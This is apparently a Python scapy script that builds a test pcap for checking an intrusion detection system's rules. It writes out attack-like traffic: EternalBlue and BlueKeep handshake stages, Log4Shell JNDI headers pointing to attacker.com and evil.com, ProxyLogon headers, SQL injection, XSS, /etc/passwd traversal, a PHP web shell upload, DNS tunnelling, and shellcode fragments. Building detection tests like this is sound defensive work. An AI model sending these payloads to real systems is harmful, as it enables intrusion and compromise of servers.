#!/usr/bin/env python3
"""
gen_test_pcap.py v2 - 精准覆盖 STATELESS/STATEFUL/THRESHOLD 三类规则的测试 pcap
"""
from scapy.all import wrpcap, Ether, IP, TCP, UDP, Raw, DNS, DNSQR
import os

ETH_SRC = "00:11:22:33:44:55"
ETH_DST = "aa:bb:cc:dd:ee:ff"
SRC_IP  = "192.168.100.200"
DST_IP  = "192.168.100.1"
OUTPUT  = "tests/test_attack.pcap"
os.makedirs("tests", exist_ok=True)
pkts = []
seq_base = 1000

def make_tcp(sport, dport, payload, flags="PA", src=SRC_IP, dst=DST_IP):
    global seq_base
    seq_base += len(payload) + 1
    return (Ether(src=ETH_SRC, dst=ETH_DST) /
            IP(src=src, dst=dst) /
            TCP(sport=sport, dport=dport, flags=flags, seq=seq_base, ack=1) /
            Raw(load=payload))

def make_udp(sport, dport, payload, src=SRC_IP, dst=DST_IP):
    return (Ether(src=ETH_SRC, dst=ETH_DST) /
            IP(src=src, dst=dst) /
            UDP(sport=sport, dport=dport) /
            Raw(load=payload))

def make_syn(sport, dport, src=SRC_IP, dst=DST_IP):
    return (Ether(src=ETH_SRC, dst=ETH_DST) /
            IP(src=src, dst=dst) /
            TCP(sport=sport, dport=dport, flags="S", seq=seq_base))

# ============================================================
# VDE-001 EternalBlue STATEFUL: 阶段1 SMBv1 Negotiate
# ============================================================
smb1_neg = bytes([
    0x00,0x00,0x00,0x54,
    0xFF,0x53,0x4D,0x42,  # SMB1 magic
    0x72,                  # cmd: Negotiate
    0x00,0x00,0x00,0x00,
    0x18,0x01,0x48,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
    0x00,0x0C,0x00,0x02,
    0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00
])
pkts.append(make_tcp(54321, 445, smb1_neg))
print("[+] VDE-001 P1: EternalBlue SMBv1 Negotiate")

# VDE-001 阶段2: SMBv1 Trans2 (follow_up)
smb1_trans2 = bytes([
    0x00,0x00,0x00,0x40,
    0xFF,0x53,0x4D,0x42,  # SMB1 magic
    0x25,                  # cmd: Trans2
    0x00,0x00,0x00,0x00,
    0x18,0x07,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
    0x0F,0x00,0x00,0x00
])
pkts.append(make_tcp(54321, 445, smb1_trans2))
print("[+] VDE-001 P2: EternalBlue SMBv1 Trans2 follow_up")

# ============================================================
# VDE-018 STATELESS: NOP Sled Shellcode (>=64 bytes 0x90)
# ============================================================
nop_sled = bytes([0x90]*100) + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
pkts.append(make_tcp(54322, 4444, nop_sled))
print("[+] VDE-018: NOP Sled Shellcode")

# ============================================================
# VDE-003 BlueKeep STATEFUL: 阶段1 RDP TPKT Connection Request
# ============================================================
rdp_cr = bytes([0x03,0x00,0x00,0x13,0x0E,0xE0,0x00,0x00,0x00,0x00,0x00,
                0x01,0x00,0x08,0x00,0x00,0x00,0x00,0x00])
pkts.append(make_tcp(54323, 3389, rdp_cr))
print("[+] VDE-003 P1: BlueKeep RDP Connection Request")

# VDE-003 阶段2: MS_T120 channel
rdp_ms_t120 = bytes([0x03,0x00,0x00,0x20,0x02,0xF0,0x80,
                     0x7F,0x65,0x82,0x00,0x16,0x04,0x01,0x01,
                     0x04,0x01,0x01,0x01,0x01,0xFF,
                     0x4D,0x53,0x5F,0x54,0x31,0x32,0x30,  # "MS_T120"
                     0x00,0x00,0x00])
pkts.append(make_tcp(54323, 3389, rdp_ms_t120))
print("[+] VDE-003 P2: BlueKeep MS_T120 channel follow_up")

# ============================================================
# VDE-008 Log4Shell STATELESS: JNDI in HTTP header
# ============================================================
log4shell = (b"GET /index.jsp HTTP/1.1\r\n"
             b"Host: 192.168.100.1\r\n"
             b"User-Agent: ${jndi:ldap://attacker.com/a}\r\n"
             b"X-Api-Version: ${jndi:rmi://evil.com/exp}\r\n"
             b"Accept: */*\r\n\r\n")
pkts.append(make_tcp(54324, 8080, log4shell))
print("[+] VDE-008: Log4Shell JNDI in HTTP header")

# ============================================================
# VDE-011 WannaCry DNS STATELESS: dns_query CONTAINS killswitch domain
# ============================================================
pkts.append(Ether(src=ETH_SRC, dst=ETH_DST) /
            IP(src=SRC_IP, dst="8.8.8.8") /
            UDP(sport=12345, dport=53) /
            DNS(rd=1, qd=DNSQR(qname=b"www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com")))
print("[+] VDE-011: WannaCry DNS KillSwitch")

# ============================================================
# VDE-009 ProxyLogon STATELESS: OWA path + X-BEResource cookie
# ============================================================
proxylogon = (b"GET /owa/auth/Current/themes/resources/logon.css HTTP/1.1\r\n"
              b"Host: mail.victim.com\r\n"
              b"Cookie: X-AnonResource-Backend=localhost/ecp/default.flt?~3;\r\n"
              b"X-BEResource: localhost/owa/auth/logon.aspx?~3;\r\n"
              b"Accept: */*\r\n\r\n")
pkts.append(make_tcp(54325, 443, proxylogon))
print("[+] VDE-009: ProxyLogon OWA")

# ============================================================
# VDE-010 PrintNightmare STATELESS: DCERPC spoolss bind
# ============================================================
dcerpc_bind = bytes([
    0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,
    0x48,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
    0xB8,0x10,0xB8,0x10,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
    # spoolss UUID: 12345678-1234-abcd-ef00-0123456789ab
    0x78,0x56,0x34,0x12,0x34,0x12,0xcd,0xab,
    0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab,
    0x01,0x00,0x00,0x00,
    0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,
    0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,
    0x02,0x00,0x00,0x00
])
pkts.append(make_tcp(54326, 135, dcerpc_bind))
print("[+] VDE-010: PrintNightmare DCERPC spoolss")

# ============================================================
# VDE-037 HTTP SQL Injection STATELESS
# ============================================================
sqli = (b"GET /index.php?id=1'+OR+'1'='1 HTTP/1.1\r\n"
        b"Host: 192.168.100.1\r\n"
        b"User-Agent: sqlmap/1.7\r\n\r\n")
pkts.append(make_tcp(54329, 80, sqli))
print("[+] VDE-037: HTTP SQL Injection")

# ============================================================
# VDE-038 HTTP XSS STATELESS
# ============================================================
xss = (b"GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\r\n"
       b"Host: 192.168.100.1\r\n\r\n")
pkts.append(make_tcp(54330, 80, xss))
print("[+] VDE-038: HTTP XSS")

# ============================================================
# VDE-039 HTTP Path Traversal STATELESS
# ============================================================
traversal = (b"GET /../../etc/passwd HTTP/1.1\r\n"
             b"Host: 192.168.100.1\r\n\r\n")
pkts.append(make_tcp(54331, 80, traversal))
print("[+] VDE-039: HTTP Path Traversal")

# ============================================================
# VDE-040 HTTP WebShell Upload STATELESS
# ============================================================
webshell = (b"POST /upload.php HTTP/1.1\r\n"
            b"Host: 192.168.100.1\r\n"
            b"Content-Type: multipart/form-data; boundary=----Boundary\r\n"
            b"Content-Length: 100\r\n\r\n"
            b"------Boundary\r\n"
            b"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n"
            b"<?php system($_GET['cmd']); ?>\r\n"
            b"------Boundary--\r\n")
pkts.append(make_tcp(54332, 80, webshell))
print("[+] VDE-040: HTTP WebShell Upload")

# ============================================================
# VDE-042 HTTP Scanner UserAgent STATELESS
# ============================================================
scanner = (b"GET / HTTP/1.1\r\n"
           b"Host: 192.168.100.1\r\n"
           b"User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)\r\n"
           b"Accept: */*\r\n\r\n")
pkts.append(make_tcp(54333, 80, scanner))
print("[+] VDE-042: HTTP Scanner UserAgent (sqlmap)")

# ============================================================
# VDE-014 SYN Port Scan THRESHOLD: >=15 SYN in 5s
# ============================================================
scan_ports = [21,22,23,25,80,110,135,139,143,443,445,3306,3389,5432,8080]
for port in scan_ports:
    pkts.append(make_syn(54334, port))
print(f"[+] VDE-014: SYN Port Scan ({len(scan_ports)} ports)")

# ============================================================
# VDE-044 DNS Tunneling STATELESS
# ============================================================
tunnel_domain = b"aGVsbG93b3JsZGhlbGxvd29ybGQ.c2VjcmV0ZGF0YQ.evil.com"
dns_tunnel_pkt = bytes([0x00,0x02,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00])
for part in tunnel_domain.split(b"."):
    dns_tunnel_pkt += bytes([len(part)]) + part
dns_tunnel_pkt += b"\x00\x00\x01\x00\x01"
pkts.append(make_udp(54335, 53, dns_tunnel_pkt))
print("[+] VDE-044: DNS Tunneling")

# ============================================================
# VDE-046 Cobalt Strike HTTP Beacon STATELESS
# ============================================================
cs_beacon = (b"GET /updates.rss HTTP/1.1\r\n"
             b"Host: 192.168.100.1\r\n"
             b"User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\r\n"
             b"Accept: */*\r\n\r\n")
pkts.append(make_tcp(54336, 80, cs_beacon))
print("[+] VDE-046: Cobalt Strike Beacon HTTP")

# ============================================================
# VDE-048 Emotet C2 HTTP STATELESS
# ============================================================
emotet = (b"POST /abcd1234/ HTTP/1.1\r\n"
          b"Host: 192.168.100.1\r\n"
          b"Content-Type: application/x-www-form-urlencoded\r\n"
          b"Content-Length: 32\r\n\r\n"
          b"data=aGVsbG93b3JsZA==&id=12345678")
pkts.append(make_tcp(54337, 80, emotet))
print("[+] VDE-048: Emotet C2 HTTP POST")

# ============================================================
# VDE-050 Metasploit Stager STATELESS
# ============================================================
meterpreter = bytes([0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                     0xcc,0x00,0x00,0x00,0x41,0x51,
                     0x41,0x50,0x52,0x51,0x56,0x48,
                     0x31,0xd2,0x65,0x48,0x8b,0x52,0x60])
pkts.append(make_tcp(54338, 4444, meterpreter))
print("[+] VDE-050: Metasploit Stager shellcode")

# ============================================================
# VDE-051 Heap Spray STATELESS
# ============================================================
heap_spray = bytes([0x0c]*64)
pkts.append(make_tcp(54339, 80, heap_spray))
print("[+] VDE-051: Heap Spray (0x0C0C0C0C)")

wrpcap(OUTPUT, pkts)
print(f"\n[OK] 已生成: {OUTPUT}  ({len(pkts)} 个包)")
